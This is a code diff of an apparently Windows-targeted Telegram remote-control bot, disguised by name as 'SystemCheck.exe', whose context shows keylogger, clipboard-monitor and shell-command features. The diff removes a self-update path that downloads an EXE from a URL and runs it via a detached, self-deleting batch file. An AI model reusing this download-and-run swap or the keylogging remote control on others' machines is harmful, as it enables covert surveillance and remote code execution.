@@ -43,8 +43,7 @@ ALLOWED_ROOTS += [os.path.expanduser('~')]
 from config import (
     API_TOKEN, ADMIN_ID, BASE_DIR, BLOCKED_FILE, SETTINGS_FILE,
     BROWSER_PATHS, MAX_WORKERS, logger, AUDIO_AVAILABLE, TTS_AVAILABLE,
-    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN,
-    NAS_WEBDAV_URL, NAS_WEBDAV_USER, NAS_WEBDAV_PASS
+    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN
 )
 
 from utils import (
@@ -74,7 +73,7 @@ from keylogger import get_keylogger, PYNPUT_AVAILABLE
 config = {
     'MONITOR_INTERVAL': MONITOR_INTERVAL,
     'CPU_ALERT_THRESHOLD': CPU_ALERT_THRESHOLD,
-    'CPU_ALERT_COOLDOWN': CPU_ALERT_COOLDOWN,
+    'CPU_ALERT_COOLDOWN': CPU_ALERT_COOLDOWN
 }
 
 AUDIT_FILE = os.path.join(BASE_DIR, "audit.log")
@@ -83,13 +82,10 @@ bot = TeleBot(API_TOKEN, num_threads=8)
 bot_stats = BotStats()
 monitor = None
 upload_state    = {}
-_pending_update = {}  # chat_id -> {'new': tmp_exe_path, 'exe': current_exe_path}
 active_streams  = {}  # chat_id -> {'event': threading.Event, 'thread': Thread, 'count': int}
 _streams_lock   = threading.Lock()  # Synchronize active_streams access
 _upload_lock    = threading.Lock()  # Synchronize upload_state access
-_pending_lock   = threading.Lock()  # Synchronize _pending_update access
 _EXIT_REASON_FILE = os.path.join(BASE_DIR, '.exit_reason')  # For watchdog exit tracking
-_UPDATE_BACKUP_FILE = os.path.join(BASE_DIR, '.update_backup')
 
 # Thread pool for fire-and-forget tasks (avoids spawning a new thread per command)
 _executor = ThreadPoolExecutor(max_workers=12, thread_name_prefix="botworker")
@@ -187,28 +183,6 @@ def _del_upload_state(cid):
         upload_state.pop(cid, None)
 
 
-def _get_pending_update(cid):
-    """Thread-safe getter for pending update"""
-    with _pending_lock:
-        return _pending_update.get(cid)
-
-
-def _set_pending_update(cid, data):
-    """Thread-safe setter for pending update"""
-    with _pending_lock:
-        _pending_update[cid] = data
-
-
-def _del_pending_update(cid):
-    """Thread-safe deleter for pending update"""
-    with _pending_lock:
-        _pending_update.pop(cid, None)
-
-
-def _pop_pending_update(cid):
-    """Thread-safe pop for pending update (atomic get+delete)."""
-    with _pending_lock:
-        return _pending_update.pop(cid, None)
 
 # ==============================================================================
 # BOT MENUS
@@ -278,8 +252,6 @@ def help_handler(m):
         "/clipmon — Toggle clipboard monitor\n"
         "/reload — Tải lại .env\n"
         "/restart — Khởi động lại bot \n"
-        "/update [url] — Update EXE từ NAS/URL\n"
-        "/rollback — Rollback EXE cũ sau update\n"
         "/cancel — Hủy thao tác đang chờ\n"
         "/stop — Tắt bot + watchdog (không restart)\n"
         "/auditlog [N] — Xem N dòng audit log\n"
@@ -317,8 +289,6 @@ def _setup_bot_commands():
             BotCommand("cmdlist",  "Danh sách lệnh shell hợp lệ"),
             BotCommand("reload",    "Tải lại config .env"),
             BotCommand("restart",   "Khởi động lại bot "),
-            BotCommand("update",    "Update EXE từ NAS/URL [url]"),
-            BotCommand("rollback",  "Rollback về EXE cũ sau update"),
             BotCommand("cancel",    "Hủy thao tác đang chờ"),
             BotCommand("stop",      "Tắt bot và watchdog hoàn toàn"),
             BotCommand("auditlog", "Xem audit log [N dòng]"),
@@ -1515,11 +1485,6 @@ def cmd_reload(m):
         config['MONITOR_INTERVAL']    = float(os.getenv("MONITOR_INTERVAL", MONITOR_INTERVAL))
         config['CPU_ALERT_THRESHOLD'] = float(os.getenv("CPU_ALERT_THRESHOLD", CPU_ALERT_THRESHOLD))
         config['CPU_ALERT_COOLDOWN']  = float(os.getenv("CPU_ALERT_COOLDOWN", CPU_ALERT_COOLDOWN))
-        # Refresh NAS credentials so /update picks up new values without restart
-        global NAS_WEBDAV_URL, NAS_WEBDAV_USER, NAS_WEBDAV_PASS
-        NAS_WEBDAV_URL  = os.getenv("NAS_WEBDAV_URL",  NAS_WEBDAV_URL)
-        NAS_WEBDAV_USER = os.getenv("NAS_WEBDAV_USER", NAS_WEBDAV_USER)
-        NAS_WEBDAV_PASS = os.getenv("NAS_WEBDAV_PASS", NAS_WEBDAV_PASS)
         bot_stats.increment_command()
         audit("/reload", m.from_user.id)
         logger.info("Config hot-reloaded from .env")
@@ -1544,214 +1509,6 @@ def cmd_restart(m):
         reply_markup=mk, parse_mode="Markdown")
     audit("/restart", m.from_user.id)
 
-# ==============================================================================
-# REMOTE UPDATE (EXE)
-# ==============================================================================
-
-def _write_update_backup(backup_path: str, exe_path: str):
-    """Persist backup info to disk so /rollback works after restart."""
-    try:
-        import json
-        with open(_UPDATE_BACKUP_FILE, 'w', encoding='utf-8') as f:
-            json.dump({'backup': backup_path, 'exe': exe_path}, f)
-    except Exception as e:
-        logger.warning(f"Failed to write update backup file: {e}")
-
-def _read_update_backup():
-    """Return backup info dict or None."""
-    try:
-        import json
-        if os.path.exists(_UPDATE_BACKUP_FILE):
-            with open(_UPDATE_BACKUP_FILE, 'r', encoding='utf-8') as f:
-                return json.load(f)
-    except Exception:
-        pass
-    return None
-
-def _clear_update_backup():
-    try:
-        if os.path.exists(_UPDATE_BACKUP_FILE):
-            os.remove(_UPDATE_BACKUP_FILE)
-    except Exception:
-        pass
-
-def _cleanup_new_exe(path: str):
-    try:
-        if path and os.path.exists(path):
-            os.remove(path)
-    except Exception:
-        pass
-
-
-@bot.message_handler(commands=['update'])
-def cmd_update(m):
-    """/update [url] — tải EXE mới từ NAS/URL, backup rồi swap & restart"""
-    if m.from_user.id != ADMIN_ID:
-        return
-
-    if not getattr(sys, 'frozen', False):
-        bot.reply_to(m,
-            "⚠️ Bot đang chạy từ source .py.\n"
-            "Lệnh /update chỉ hoạt động khi chạy dưới dạng *SystemCheck.exe*.",
-            parse_mode="Markdown")
-        return
-
-    parts = m.text.split(maxsplit=1)
-    url = parts[1].strip() if len(parts) > 1 else None
-
-    # Mode B: no URL → use WebDAV from .env
-    if not url:
-        if not NAS_WEBDAV_URL:
-            bot.reply_to(m,
-                "❌ Chưa cấu hình `NAS_WEBDAV_URL` trong .env\n\n"
-                "*Cách dùng:*\n"
-                "`/update <url>` — dùng DSM share link hoặc URL trực tiếp\n\n"
-                "*Hoặc thêm vào .env để dùng WebDAV:*\n"
-                "`NAS_WEBDAV_URL=https://domain:port/path/SystemCheck.exe`\n"
-                "`NAS_WEBDAV_USER=admin`\n"
-                "`NAS_WEBDAV_PASS=password`",
-                parse_mode="Markdown")
-            return
-        url = NAS_WEBDAV_URL
-        auth = (NAS_WEBDAV_USER, NAS_WEBDAV_PASS) if NAS_WEBDAV_USER else None
-        mode_label = "WebDAV (NAS)"
-    else:
-        # Mode A: URL provided
-        if not url.startswith(('http://', 'https://')):
-            bot.reply_to(m, "❌ URL phải bắt đầu bằng `http://` hoặc `https://`",
-                         parse_mode="Markdown")
-            return
-        auth = None
-        mode_label = "URL trực tiếp"
-
-    def download_task():
-        exe_path = sys.executable
-        new_path = os.path.join(BASE_DIR, '_SystemCheck_new.exe')
-        try:
-            status_msg = bot.reply_to(m, f"⬇️ Đang kết nối ({mode_label})...")
-
-            try:
-                resp = requests.get(
-                    url, stream=True, auth=auth, timeout=60, verify=True,
-                    headers={'User-Agent': 'SystemCheck-Updater/1.0'})
-                resp.raise_for_status()
-            except requests.exceptions.SSLError:
-                bot.edit_message_text(
-                    "❌ Lỗi SSL certificate.\n"
-                    "DSM cần bật HTTPS với Let's Encrypt tại Control Panel → Security.",
-                    m.chat.id, status_msg.message_id)
-                return
-            except requests.exceptions.ConnectionError:
-                bot.edit_message_text(
-                    "❌ Không kết nối được. Kiểm tra URL/NAS có online không.",
-                    m.chat.id, status_msg.message_id)
-                return
-            except requests.exceptions.HTTPError:
-                bot.edit_message_text(
-                    f"❌ HTTP {resp.status_code}. Kiểm tra đường dẫn file và quyền truy cập.",
-                    m.chat.id, status_msg.message_id)
-                return
-
-            total = int(resp.headers.get('content-length', 0))
-            downloaded = 0
-            last_edit = time.time()
-
-            with open(new_path, 'wb') as f:
-                for chunk in resp.iter_content(chunk_size=512 * 1024):  # 512KB chunks
-                    if chunk:
-                        f.write(chunk)
-                        downloaded += len(chunk)
-                        now = time.time()
-                        if now - last_edit >= 4:
-                            if total:
-                                pct = int(downloaded / total * 100)
-                                txt = (f"⬇️ Đang tải ({mode_label})... {pct}%\n"
-                                       f"{downloaded/1024/1024:.1f} / {total/1024/1024:.1f} MB")
-                            else:
-                                txt = f"⬇️ Đang tải ({mode_label})... {downloaded/1024/1024:.1f} MB"
-                            try:
-                                bot.edit_message_text(txt, m.chat.id, status_msg.message_id)
-                            except Exception:
-                                pass
-                            last_edit = now
-
-            file_size = os.path.getsize(new_path)
-
-            # Validate Windows PE header
-            with open(new_path, 'rb') as f:
-                header = f.read(2)
-            if header != b'MZ':
-                _cleanup_new_exe(new_path)
-                bot.edit_message_text(
-                    "❌ File tải về không phải EXE hợp lệ (không có MZ header).\n"
-                    "Kiểm tra URL có trỏ đúng đến file .exe không.",
-                    m.chat.id, status_msg.message_id)
-                return
-            if file_size < 5 * 1024 * 1024:
-                _cleanup_new_exe(new_path)
-                bot.edit_message_text(
-                    f"❌ File chỉ {file_size//1024} KB — quá nhỏ, nghi tải sai file.",
-                    m.chat.id, status_msg.message_id)
-                return
-
-            markup = types.InlineKeyboardMarkup()
-            markup.row(
-                types.InlineKeyboardButton("✅ Apply & Restart", callback_data="update|apply"),
-                types.InlineKeyboardButton("❌ Hủy", callback_data="update|cancel_dl"),
-            )
-            bot.edit_message_text(
-                f"✅ Tải xong: *{file_size/1024/1024:.1f} MB*\n"
-                f"📡 Nguồn: {mode_label}\n\n"
-                f"⚠️ Xác nhận swap & restart?",
-                m.chat.id, status_msg.message_id,
-                reply_markup=markup, parse_mode="Markdown")
-            _set_pending_update(m.chat.id, {'new': new_path, 'exe': exe_path})
-            audit("/update download ok", m.from_user.id)
-
-        except requests.exceptions.Timeout:
-            _cleanup_new_exe(new_path)
-            bot.reply_to(m, "❌ Timeout khi tải. Thử lại sau.")
-        except Exception as e:
-            _cleanup_new_exe(new_path)
-            logger.error(f"cmd_update download_task failed: {e}")
-            bot.reply_to(m, f"❌ Lỗi tải: {e}")
-
-    _executor.submit(download_task)
-    audit("/update", m.from_user.id)
-
-
-@bot.message_handler(commands=['rollback'])
-def cmd_rollback(m):
-    """/rollback — khôi phục EXE cũ sau khi update"""
-    if m.from_user.id != ADMIN_ID:
-        return
-    if not getattr(sys, 'frozen', False):
-        bot.reply_to(m, "⚠️ Chỉ hoạt động khi chạy dưới dạng EXE.")
-        return
-
-    info = _read_update_backup()
-    if not info:
-        bot.reply_to(m, "ℹ️ Không có backup nào để rollback.")
-        return
-
-    backup_path = info.get('backup', '')
-    if not os.path.exists(backup_path):
-        bot.reply_to(m,
-            f"❌ Backup không còn tồn tại: `{os.path.basename(backup_path)}`",
-            parse_mode="Markdown")
-        _clear_update_backup()
-        return
-
-    markup = types.InlineKeyboardMarkup()
-    markup.row(
-        types.InlineKeyboardButton("↩️ Xác nhận Rollback", callback_data="update|rollback_ok"),
-        types.InlineKeyboardButton("❌ Hủy", callback_data="update|rollback_no"),
-    )
-    bot.reply_to(m,
-        f"⚠️ Rollback về: `{os.path.basename(backup_path)}`\nBot sẽ restart sau khi swap.",
-        reply_markup=markup, parse_mode="Markdown")
-
-
 @bot.message_handler(commands=['cancel'])
 def cmd_cancel(m):
     """/cancel — huỷ lệnh đang chờ (upload)"""
@@ -1763,10 +1520,6 @@ def cmd_cancel(m):
     if upload:
         _del_upload_state(cid)
         cleared.append("upload")
-    pending = _pop_pending_update(cid)
-    if pending:
-        _cleanup_new_exe(pending.get('new'))
-        cleared.append("update")
     if cleared:
         bot.reply_to(m, f"❌ Đã hủy: {', '.join(cleared)}")
     else:
@@ -2058,137 +1811,6 @@ def cb_handler(c):
                 bot.answer_callback_query(c.id, "ℹ️ Không có stream")
             return
 
-        # Remote update — apply swap or cancel download
-        if data == "update|apply":
-            pending = _pop_pending_update(cid)
-            bot.answer_callback_query(c.id, "🔄 Đang apply...")
-            if not pending:
-                bot.edit_message_text("❌ Không có update đang chờ.", cid, msg.message_id)
-                return
-
-            def do_swap(p=pending):
-                import shutil
-                new_path = p['new']
-                exe_path = p['exe']
-                try:
-                    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
-                    exe_dir  = os.path.dirname(exe_path)
-                    exe_stem = os.path.splitext(os.path.basename(exe_path))[0]
-                    backup_path = os.path.join(exe_dir, f"{exe_stem}_backup_{ts}.exe")
-
-                    # Backup current EXE
-                    shutil.copy2(exe_path, backup_path)
-                    # Persist backup info for /rollback after restart
-                    _write_update_backup(backup_path, exe_path)
-
-                    # Detached bat: wait 3s, swap, start new EXE, self-delete
-                    # UTF-8 BOM + chcp 65001 so Vietnamese/non-ASCII paths are handled correctly
-                    bat = (
-                        "@chcp 65001 >nul\r\n"
-                        "@echo off\r\n"
-                        "timeout /t 3 /nobreak >nul\r\n"
-                        f'move /y "{new_path}" "{exe_path}"\r\n'
-                        f'start "" "{exe_path}"\r\n'
-                        'del "%~f0"\r\n'
-                    )
-                    bat_path = os.path.join(BASE_DIR, '_update_swap.bat')
-                    with open(bat_path, 'w', encoding='utf-8-sig') as f:
-                        f.write(bat)
-
-                    subprocess.Popen(
-                        ['cmd.exe', '/c', bat_path],
-                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
-                        close_fds=True,
-                        cwd=BASE_DIR,
-                    )
-
-                    backup_name = os.path.basename(backup_path)
-                    bot.edit_message_text(
-                        f"🔄 Swap đang diễn ra, bot sẽ restart sau ~3 giây.\n"
-                        f"📦 Backup: `{backup_name}`\n"
-                        f"Dùng `/rollback` sau khi restart nếu cần.",
-                        cid, msg.message_id, parse_mode="Markdown")
-                    audit("/update apply", ADMIN_ID)
-                    logger.info(f"Swap launched: {exe_path} | backup: {backup_path}")
-                    _write_exit_reason("update_restart")
-                    time.sleep(0.5)
-                    os._exit(0)
-                except Exception as e:
-                    logger.error(f"do_swap failed: {e}")
-                    bot.send_message(cid, f"❌ Swap thất bại: {e}")
-                    _cleanup_new_exe(new_path)
-
-            try:
-                _executor.submit(do_swap)
-            except Exception as e:
-                # Restore state so user can retry apply/cancel.
-                _set_pending_update(cid, pending)
-                logger.error(f"submit do_swap failed: {e}")
-                bot.send_message(cid, f"❌ Không thể chạy update: {e}")
-            return
-
-        if data == "update|cancel_dl":
-            pending = _pop_pending_update(cid)
-            if pending:
-                _cleanup_new_exe(pending.get('new'))
-            bot.answer_callback_query(c.id, "❌ Đã hủy")
-            bot.edit_message_text("❌ Đã hủy update.", cid, msg.message_id)
-            return
-
-        # Remote update — rollback to backup EXE
-        if data == "update|rollback_ok":
-            info = _read_update_backup()
-            bot.answer_callback_query(c.id, "↩️ Đang rollback...")
-            if not info:
-                bot.edit_message_text("❌ Không tìm thấy backup.", cid, msg.message_id)
-                return
-
-            def do_rollback(i=info):
-                backup_path = i.get('backup', '')
-                exe_path    = i.get('exe', sys.executable)
-                try:
-                    if not os.path.exists(backup_path):
-                        bot.send_message(cid, "❌ Backup file không còn tồn tại.")
-                        _clear_update_backup()
-                        return
-
-                    bat = (
-                        "@chcp 65001 >nul\r\n"
-                        "@echo off\r\n"
-                        "timeout /t 3 /nobreak >nul\r\n"
-                        f'move /y "{backup_path}" "{exe_path}"\r\n'
-                        f'start "" "{exe_path}"\r\n'
-                        'del "%~f0"\r\n'
-                    )
-                    bat_path = os.path.join(BASE_DIR, '_rollback_swap.bat')
-                    with open(bat_path, 'w', encoding='utf-8-sig') as f:
-                        f.write(bat)
-
-                    subprocess.Popen(
-                        ['cmd.exe', '/c', bat_path],
-                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
-                        close_fds=True,
-                        cwd=BASE_DIR,
-                    )
-                    bot.edit_message_text(
-                        "↩️ Rollback bat đã chạy. Bot sẽ restart về bản cũ sau ~3 giây.",
-                        cid, msg.message_id)
-                    audit("/rollback apply", ADMIN_ID)
-                    logger.info(f"Rollback launched → {exe_path}")
-                    _write_exit_reason("rollback_restart")
-                    time.sleep(0.5)
-                    os._exit(0)
-                except Exception as e:
-                    logger.error(f"do_rollback failed: {e}")
-                    bot.send_message(cid, f"❌ Rollback thất bại: {e}")
-
-            _executor.submit(do_rollback)
-            return
-
-        if data == "update|rollback_no":
-            bot.answer_callback_query(c.id, "❌ Đã hủy")
-            bot.edit_message_text("❌ Đã hủy rollback.", cid, msg.message_id)
-            return
 
         # Keylogger controls — format: kl|action
         if data.startswith("kl|"):
